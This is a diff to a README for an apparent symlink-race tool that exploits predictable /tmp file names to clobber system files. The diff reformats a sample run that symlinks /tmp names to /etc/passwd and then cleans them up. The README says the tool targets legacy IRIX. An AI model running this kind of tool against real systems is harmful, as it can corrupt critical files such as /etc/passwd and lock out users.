@@ -3,8 +3,8 @@ using $$ to generate a unique file name in /tmp. I wrote this simple tool to gen
 files if the root user were to run any of the vulnerable utitliies.
 
 This code creates an x number of symlinks using the pid in the filename in order to clobber system files by linking to them when programs use /tmp in an insecure manner. This isn't really a problem on modern day unixes.  I've developed and tested it on an SGI Indy R5000 running IRIX 6.5.22.  After running it monitors the target file's modification time to determine if the exploitation succeeded. 
-
-`larry@mathom:~/code/symlinker$ ./symlink 10 to_dos /etc/passwd
+```
+larry@mathom:~/code/symlinker$ ./symlink 10 to_dos /etc/passwd
 Starting from our own process id: 259857
 Symlinking /tmp/to_dos259857->/etc/passwd
 Symlinking /tmp/to_dos259858->/etc/passwd
@@ -32,4 +32,5 @@ Unlinking -> /tmp/to_dos259861
 Unlinking -> /tmp/to_dos259860
 Unlinking -> /tmp/to_dos259859
 Unlinking -> /tmp/to_dos259858
-Unlinking -> /tmp/to_dos259857`
+Unlinking -> /tmp/to_dos259857
+```
